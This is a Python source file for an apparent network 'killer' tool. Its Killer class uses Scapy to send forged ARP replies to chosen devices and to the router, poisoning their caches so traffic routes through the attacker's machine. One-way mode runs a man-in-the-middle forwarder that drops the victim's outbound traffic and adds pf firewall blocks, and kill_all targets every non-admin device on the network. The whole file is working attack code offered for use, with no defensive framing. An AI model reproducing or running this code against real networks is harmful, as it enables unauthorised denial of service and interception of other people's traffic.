from scapy.all import ARP, Ether, sendp, conf
from time import sleep

from networking.forwarder import MitmForwarder
from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
from tools.utils import threaded, get_default_iface
from constants import *

class Killer:
    def __init__(self, router=DUMMY_ROUTER):
        self.iface = get_default_iface()
        # Use guid (Scapy/pcap name) for conf.iface, not friendly name
        conf.iface = self.iface.guid if self.iface.guid else self.iface.name
        self.router = router
        self.killed = {}
        self.storage = {}
        self.forwarders = {}
        self.pf_blocks = set()
    
    @threaded
    def kill(self, victim, wait_after=1):
        """
        Spoofing victim
        """
        if victim['mac'] in self.killed:
            return
        
        self.killed[victim['mac']] = victim

        # Send ARP reply (is-at) with proper Ethernet destination to poison caches
        # Victim: tell victim that router IP is at our MAC
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.iface.mac,
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        # Router: tell router that victim IP is at our MAC
        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=self.iface.mac,
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name

        while victim['mac'] in self.killed \
            and self.iface.name != 'NULL':
            # Send packets to both victim and router (L2 frames)
            sendp(to_victim, iface=iface_to_use, verbose=0)
            sendp(to_router, iface=iface_to_use, verbose=0)
            sleep(wait_after)

        self._stop_forwarder(victim['mac'])

    @threaded
    def unkill(self, victim):
        """
        Unspoofing victim
        """
        if victim['mac'] in self.killed:
            self.killed.pop(victim['mac'])

        # Restore Victim and Router with correct mappings
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.router['mac'],
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=victim['mac'],
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if self.iface.name != 'NULL':
            # Send packets to both victim and router
            for _ in range(3):
                sendp(to_victim, iface=iface_to_use, verbose=0)
                sendp(to_router, iface=iface_to_use, verbose=0)
        self._stop_forwarder(victim['mac'])
        self._remove_pf_block(victim['ip'])

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """
        Safely unkill all devices killed previously
        """
        for mac in list(self.killed):
            self.killed.pop(mac)
            self._stop_forwarder(mac)
        for ip in list(self.pf_blocks):
            self._remove_pf_block(ip)
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break
                
            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            self.kill(old)

    def one_way_kill(self, victim):
        """
        Kill victim and ensure traffic is forwarded inbound-only (drop outbound).
        Uses PF to block outbound at kernel level for guaranteed effect.
        """
        # Always ensure victim is being poisoned
        if victim['mac'] not in self.killed:
            self.kill(victim)
            # Wait for poison to actually start sending
            for _ in range(10):
                sleep(0.1)
                if victim['mac'] in self.killed:
                    break
        
        # Start forwarder (inbound allowed, outbound dropped in userspace)
        self._start_one_way_forwarder(victim)
        
        # CRITICAL: Block at kernel level with pf so OS can't bypass
        self._enforce_pf_block(victim['ip'])

    def _start_one_way_forwarder(self, victim, debug=False):
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            if debug:
                print(f"[killer] Cannot start forwarder: router MAC unknown")
            return
        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if not iface_to_use or iface_to_use == 'NULL':
            if debug:
                print(f"[killer] Cannot start forwarder: invalid interface")
            return
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=iface_to_use,
            iface_mac=self.iface.mac,
            drop_from_victim=True,
            drop_to_victim=False,
        )
        self.forwarders[victim['mac']] = fw
        if debug:
            print(f"[killer] Forwarder started for {victim['ip']}")
    
    def get_forwarder_stats(self, mac):
        """Get stats for a specific forwarder"""
        fw = self.forwarders.get(mac)
        if fw:
            return fw.get_stats()
        return None

    def _stop_forwarder(self, mac):
        fw = self.forwarders.pop(mac, None)
        if fw:
            fw.stop()

    def _enforce_pf_block(self, victim_ip: str):
        if victim_ip in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            if block_all_for(self.iface.name, victim_ip):
                self.pf_blocks.add(victim_ip)

    def _remove_pf_block(self, victim_ip: str):
        if victim_ip not in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            unblock_all_for(victim_ip)
        self.pf_blocks.discard(victim_ip)
